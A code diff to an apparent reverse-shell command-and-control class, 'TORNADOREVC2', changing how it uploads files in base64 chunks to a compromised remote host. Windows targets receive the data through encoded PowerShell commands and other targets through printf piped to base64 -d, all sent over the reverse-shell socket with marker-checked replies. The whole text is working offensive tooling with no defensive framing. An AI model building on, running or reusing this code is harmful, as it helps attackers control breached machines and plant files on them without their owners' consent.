@@ -421,7 +421,6 @@ class TORNADOREVC2:
     _WIN_PS_CMD_LIMIT = 8190
 
     def _max_win_inline_chunk(self, remote_path, truncate=False):
-        """Largest raw payload that fits in one inline PowerShell write command."""
         path = self._escape_path(remote_path, 'windows')
         mode = 'Create' if truncate else 'Append'
         template = (
@@ -433,14 +432,13 @@ class TORNADOREVC2:
         overhead = len(f'powershell -NoProfile -Command "{template}"')
         available = self._WIN_PS_CMD_LIMIT - overhead
         if available <= 0:
-            return CHUNK_SIZE['windows']
+            return 4096
         return max(1024, int(available * 3 / 4))
 
     def _write_chunk_size(self, remote_path, shell_type, truncate=False):
-        base = CHUNK_SIZE.get(shell_type, CHUNK_SIZE['unknown'])
         if shell_type == 'windows':
-            return min(base, self._max_win_inline_chunk(remote_path, truncate=truncate))
-        return base
+            return 4096   # Safe with -EncodedCommand (well under 8190 chars)
+        return CHUNK_SIZE.get(shell_type, CHUNK_SIZE['unknown'])
 
     def _win_ps_cmd(self, script):
         encoded = base64.b64encode(script.encode('utf-16-le')).decode('ascii')
@@ -616,18 +614,28 @@ class TORNADOREVC2:
         return True
 
     def _remote_write_chunk(self, client_sock, remote_path, chunk_bytes, shell_type, truncate=False, skip_flush=False):
-        path = self._escape_path(remote_path, shell_type)
-        b64 = base64.b64encode(chunk_bytes).decode()
         if shell_type == 'windows':
-            mode = 'Create' if truncate else 'Append'
-            win_ps = (
-                f"$d=[Convert]::FromBase64String('{b64}');"
-                f"$fs=[IO.File]::Open('{path}', [IO.FileMode]::{mode});"
-                f"$fs.Write($d,0,$d.Length);$fs.Close();"
-                f"'{XFER_MARK_START}OK{XFER_MARK_END}'"
-            )
-            cmd = self._win_ps_inline(win_ps)
+            path_esc = remote_path.replace('\\', '\\\\')
+            path_esc = path_esc.replace('"', '`"')
+            b64 = base64.b64encode(chunk_bytes).decode('ascii')
+            if truncate:
+                ps_script = f"""
+    $b = [Convert]::FromBase64String('{b64}')
+    [IO.File]::WriteAllBytes("{path_esc}", $b)
+    '{XFER_MARK_START}OK{XFER_MARK_END}'
+    """
+            else:
+                ps_script = f"""
+    $b = [Convert]::FromBase64String('{b64}')
+    [IO.File]::AppendAllBytes("{path_esc}", $b)
+    '{XFER_MARK_START}OK{XFER_MARK_END}'
+    """
+            cmd = self._win_ps_cmd(ps_script)
+            if cmd is None:
+                cmd = self._win_ps_inline(ps_script)
         else:
+            path = self._escape_path(remote_path, shell_type)
+            b64 = base64.b64encode(chunk_bytes).decode()
             mode = 'wb' if truncate else 'ab'
             cmd = (
                 f"printf '%s' '{XFER_MARK_START}'; "
@@ -638,10 +646,13 @@ class TORNADOREVC2:
                 f"(printf '%s' '{b64}' | base64 -d >> '{path}' && printf 'OK')); "
                 f"printf '%s' '{XFER_MARK_END}'"
             )
+
         if not skip_flush:
             self._flush_shell(client_sock, timeout=0.2)
+
         if not self.send_to_revshell(client_sock, cmd):
             return False
+
         output = self.recv_output(client_sock, timeout=60.0, until_marker=XFER_MARK_END)
         payload = self._extract_marked(output)
         return payload == 'OK'
